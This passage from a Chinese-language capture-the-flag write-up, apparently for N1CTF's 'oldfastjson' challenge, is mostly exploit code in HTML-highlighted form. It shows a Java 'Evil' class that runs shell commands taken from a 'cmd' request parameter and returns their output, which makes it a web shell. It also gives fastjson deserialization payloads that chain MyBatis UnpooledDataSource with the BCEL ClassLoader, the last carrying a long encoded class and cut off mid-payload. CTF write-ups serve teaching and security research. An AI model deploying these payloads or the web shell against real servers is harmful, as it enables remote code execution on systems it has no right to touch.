class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.connection&quot;</span>&#125;&#125;],<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>&#125;</code></pre></div><p>然后报错</p><p>SpringBoot fastJsonHttpMessageConverters进行JSON.parse的时候会默认设置期望类为路由参数里对应的类，也就是期望类为com.n1ctf.oldfastjson.User</p><p>导致了Root context变为了com.n1ctf.oldfastjson.User对象，因为<code>x并不是User的Field</code>，会被设置为null，导致了之前构造payload里面的各种引用都需要更改</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.n1ctf.oldfastjson;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> username;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> password;        <span class="hljs-keyword">private</span> Object friend;    。。。&#125;</code></pre></div><p>friend属性的类型为Object，所以用他进行反序列化</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        <span class="hljs-type">Class</span> <span class="hljs-variable">requestContextHolder</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> requestContextHolder.getDeclaredMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>);        m = obj.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> m.invoke(obj);        m = obj.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);        <span class="hljs-type">Object</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> m.invoke(obj);        m = request.getClass().getMethod(<span class="hljs-string">&quot;getParameter&quot;</span>, String.class);        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (String) m.invoke(request, <span class="hljs-string">&quot;cmd&quot;</span>);        <span class="hljs-keyword">if</span>(cmd == <span class="hljs-literal">null</span>)&#123;            cmd = <span class="hljs-string">&quot;id&quot;</span>;        &#125;        String[] cmds = &#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();        <span class="hljs-comment">//        读取f111111ag.txt的内容</span><span class="hljs-comment">//        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(&quot;f111111ag.txt&quot;);;</span><span class="hljs-comment">//        output = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;).next();</span>        m = response.getClass().getMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> (PrintWriter) m.invoke(response);        printWriter.println(output);        printWriter.flush();        printWriter.close();    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;a&quot;</span>:[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,],<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;friend&quot;</span>:[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.friend[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$l</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$7dV</span><span class="hljs-variable">$5bW</span><span class="hljs-variable">$hU</span><span class="hljs-variable">$U</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$86</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$ce0</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$96</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$a0eZ</span><span class="hljs-variable">$LE</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$N</span><span class="hljs-variable">$F</span><span class="hljs-variable">$82</span><span class="hljs-variable">$d6kC</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$om</span><span class="hljs-variable">$z</span><span class="hljs-variable">$g</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$S</span><span class="hljs-variable">$E</span><span class="hljs-variable">$91z</span><span class="hljs-variable">$99L</span><span class="hljs-variable">$O</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$c0d</span><span class="hljs-variable">$86</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$85</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$F</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$92</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$83k</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$c1W</span><span class="hljs-variable">$97</span><span class="hljs-variable">$P</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$Ju</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$m</span><span class="hljs-variable">$90</span><span class="hljs-variable">$d4</span><span class="hljs-variable">$5cN</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$ef</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$7dv</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$e7</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$be</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$k</span><span class="hljs-variable">$c0</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$f8RA</span><span class="hljs-variable">$x</span><span class="hljs-variable">$kWp</span><span class="hljs-variable">$k</span><span class="hljs-variable">$93bxB</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$93</span><span class="hljs-variable">$K</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$98</span><span class="hljs-variable">$921</span><span class="hljs-variable">$cd0</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$80a</span><span class="hljs-variable">$96</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$v</span><span class="hljs-variable">$Fs</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$I</span><span class="hljs-variable">$cdy</span><span class="hljs-variable">$ZO</span><span class="hljs-variable">$LpA</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$8cg</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$96d</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$90</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$8ce</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$X</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$9eS</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$Ktd</span><span class="hljs-variable">$Vt</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$90</span><span class="hljs-variable">$91</span><span class="hljs-variable">$T</span><span class="hljs-variable">$bf</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$M</span><span class="hljs-variable">$x2</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$M</span><span class="hljs-variable">$F</span><span class="hljs-variable">$F</span><span class="hljs-variable">$3d0</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$w</span><span class="hljs-variable">$865</span><span class="hljs-variable">$GKB</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$94i</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$98</span><span class="hljs-variable">$84Pb</span><span class="hljs-variable">$60ABx</span><span class="hljs-variable">$c2</span><span class="hljs-variable">$c9q</span><span class="hljs-variable">$Jmi</span><span class="hljs-variable">$d3</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$d3A1</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$ddy</span><span class="hljs-variable">$3dk</span><span class="hljs-variable">$R</span><span class="hljs-variable">$SO</span><span class="hljs-variable">$3b</span><span class="hljs-variable">$86n</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$v</span><span class="hljs-variable">$d6U0</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$XL</span><span class="hljs-variable">$8fl</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$cfn</span><span class="hljs-variable">$98</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$a8</span><span class="hljs-variable">$84N</span><span class="hljs-variable">$97_</span><span class="hljs-variable">$M</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$e7O8</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$cf7</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$95</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$84</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$be</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$8fX</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$l</span><span class="hljs-variable">$99</span><span class="hljs-variable">$b0t</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$pU</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$u</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$60</span><span class="hljs-variable">$j</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$V</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$h</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$U</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$LN</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$UBNvU</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$ddV</span><span class="hljs-variable">$99</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$92</span><span class="hljs-variable">$G</span><span class="hljs-variable">$89X</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$E</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$de</span><span class="hljs-variable">$bac</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$UK</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$u</span><span class="hljs-variable">$e6v</span><span class="hljs-variable">$eag</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$l</span><span class="hljs-variable">$s</span><span class="hljs-variable">$R</span><span class="hljs-variable">$85</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$b1</span><span class="hljs-variable">$dcL</span><span class="hljs-variable">$Yu</span><span class="hljs-variable">$C</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$m</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$J</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$X</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$d3</span><span class="hljs-variable">$X1wUtMgdv</span><span class="hljs-variable">$h</span><span class="hljs-variable">$s</span><span class="hljs-variable">$f5</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$Z_7</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$f52</span><span class="hljs-variable">$FD</span><span class="hljs-variable">$n</span><span class="hljs-variable">$r</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$a1H</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$b4HP</span><span class="hljs-variable">$cen</span><span class="hljs-variable">$g</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$dd7</span><span class="hljs-variable">$v</span><span class="hljs-variable">$s</span><span class="hljs-variable">$G</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$c1aXg</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$40</span><span class="hljs-variable">$s</span><span class="hljs-variable">$95</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$T</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$G</span><span class="hljs-variable">$3fg</span><span class="hljs-variable">$K</span><span class="hljs-variable">$eaZ</span><span class="hljs-variable">$FeI</span><span class="hljs-variable">$e1C</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$e8g</span><span class="hljs-variable">$f0T</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$ITl</span><span class="hljs-variable">$e0</span><span class="hljs-variable">$92</span><span class="hljs-variable">$84S</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$9bOz</span><span class="hljs-variable">$o</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$8a</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$X</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$r</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$5dK</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$a4Qa6Ye</span><span class="hljs-variable">$m9</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$84p</span><span class="hljs-variable">$86M</span><span class="hljs-variable">$V</span><span class="hljs-variable">$_</span><span class="hljs-variable">$e1e</span><span class="hljs-variable">$caG</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$fbU</span><span class="hljs-variable">$8dq</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$O</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$N</span><span class="hljs-variable">$7cND</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$edJ</span><span class="hljs-variable">$87</span><span class="hljs-variable">$8aW</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$84</span><span class="hljs-variable">$d8n</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$w</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$w</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$N</span><span class="hljs-variable">$8a</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$db</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$8a7</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$3de</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$96</span><span class="hljs-variable">$B</span><span class="hljs-variable">$95V</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$I</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$60l7</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$SZLJQ</span><span class="hljs-variable">$8bW</span><span class="hljs-variable">$a0a</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$uk</span><span class="hljs-variable">$E</span><span class="hljs-variable">$bei</span><span class="hljs-variable">$8dd</span><span class="hljs-variable">$M</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$b6E</span><span class="hljs-variable">$e8o</span><span class="hljs-variable">$a9x</span><span class="hljs-variable">$hWT</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$83w</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$deS</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$3e</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$E</span><span class="hljs-variable">$7dH</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$I</span><span class="hljs-variable">$l</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$E</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$S</span><span class="hljs-variable">$81</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$96</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$s</span><span class="hljs-variable">$b9R</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$3eW</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$F</span><span class="hljs-variable">$faU</span><span class="hljs-variable">$5cE</span><span class="hljs-variable">$3fU</span><span class="hljs-variable">$81</span><span class="hljs-variable">$60</span><span class="hljs-variable">$5cB</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$edj</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$ccV</span><span class="hljs-variable">$g</span><span class="hljs-variable">$r</span><span class="hljs-variable">$i</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$9fs</span><span class="hljs-variable">$C</span><span class="hljs-variable">$3bW</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$ad2</span><span class="hljs-variable">$edd</span><span class="hljs-variable">$C</span><span class="hljs-variable">$a3P</span><span class="hljs-variable">$b1X</span><span class="hljs-variable">$a71</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$e8u</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$de</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$x</span><span class="hljs-variable">$r</span><span class="hljs-variable">$c4</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$baK</span><span class="hljs-variable">$87i</span><span class="hljs-variable">$eer</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$b2x</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$N</span><span class="hljs-variable">$83</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$9dJ</span><span class="hljs-variable">$j</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$F</span><span class="hljs-variable">$97</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$U</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$pp</span><span class="hljs-variable">$5dn</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$b5ugb</span><span class="hljs-variable">$m</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$w</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$7cU</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$a5</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$97o</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$b6C</span><span class="hljs-variable">$bdN</span><span class="hljs-variable">$q</span><span class="hljs-variable">$f64</span><span class="hljs-variable">$VP</span><span class="hljs-variable">$S</span><span class="hljs-variable">$y</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$94</span><span class="hljs-variable">$R</span><span class="hljs-variable">$JG</span><span class="hljs-variable">$T</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$ab</span><span class="hljs-variable">$c1</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d9j</span><span class="hljs-variable">$t</span><span class="hljs-variable">$ffg</span><span class="hljs-variable">$b8a</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$98</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$ddd</span><span class="hljs-variable">$efr</span><span class="hljs-variable">$c3</span><span class="hljs-variable">$de</span><span class="hljs-variable">$81</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$XQ</span><span class="hljs-variable">$93</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$a32</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$99h</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$8d</span><span class="hljs-variable">$d0</span><span class="hljs-variable">$40</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$o</span><span class="hljs-variable">$Ln</span><span class="hljs-variable">$w</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$e9h</span><span class="hljs-variable">$a4c</span><span class="hljs-variable">$b4Ru</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$db</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$c5s</span><span class="hljs-variable">$81</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$9bE</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$p</span><span class="hljs-variable">$b5E</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$O</span><span class="hljs-variable">$TUX</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$p</span><span class="hljs-variable">$be</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$T</span><span class="hljs-variable">$89</span><span class="hljs-variable">$s</span><span class="hljs-variable">$N</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$88</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$eepU</span><span class="hljs-variable">$F</span><span class="hljs-variable">$r</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$pW</span><span class="hljs-variable">$936</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$da</span><span class="hljs-variable">$c9uj</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$Hj</span><span class="hljs-variable">$eeD</span><span class="hljs-variable">$Fo</span><span class="hljs-variable">$Lh</span><span class="hljs-variable">$7bw</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$404</span><span class="hljs-variable">$7c5</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$Zn</span><span class="hljs-variable">$99</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$caM</span><span class="hljs-variable">$3av</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$dfSq</span><span class="hljs-variable">$I</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$Khw</span><span class="hljs-variable">$91muUVn</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$96</span><span class="hljs-variable">$zHhb</span><span class="hljs-variable">$91</span><span class="hljs-variable">$iGV</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$40t</span><span class="hljs-variable">$82</span><span class="hljs-variable">$88a9</span><span class="hljs-variable">$kG</span><span class="hljs-variable">$l</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$7f</span><span class="hljs-variable">$3a</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$G</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$R</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$82</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$jQ</span><span class="hljs-variable">$u</span><span class="hljs-variable">$84</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$g</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$ebh</span><span class="hljs-variable">$v</span><span class="hljs-variable">$n</span><span class="hljs-variable">$U</span><span class="hljs-variable">$P</span><span class="hljs-variable">$97</span><span class="hljs-variable">$QI</span><span class="hljs-variable">$P</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$9b</span><span class="hljs-variable">$60</span><span class="hljs-variable">$r</span><span class="hljs-variable">$c8SC</span><span class="hljs-variable">$S</span><span class="hljs-variable">$cdZKP</span><span class="hljs-variable">$a6</span><span class="hljs-variable">$87K</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$TW</span><span class="hljs-variable">$x</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$de</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$w</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$K</span><span class="hljs-variable">$97</span><span class="hljs-variable">$F</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$g</span><span class="hljs-variable">$F</span><span class="hljs-variable">$R</span><span class="hljs-variable">$z</span><span class="hljs-variable">$y</span><span class="hljs-variable">$qma</span><span class="hljs-variable">$92</span><span class="hljs-variable">$y</span><span class="hljs-variable">$85</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$b1LY</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$85i</span><span class="hljs-variable">$ddJ</span><span class="hljs-variable">$ebvZ</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b7</span><span class="hljs-variable">$QKE</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$60</span><span class="hljs-variable">$f1x</span><span class="hljs-variable">$w</span><span class="hljs-variable">$g</span><span 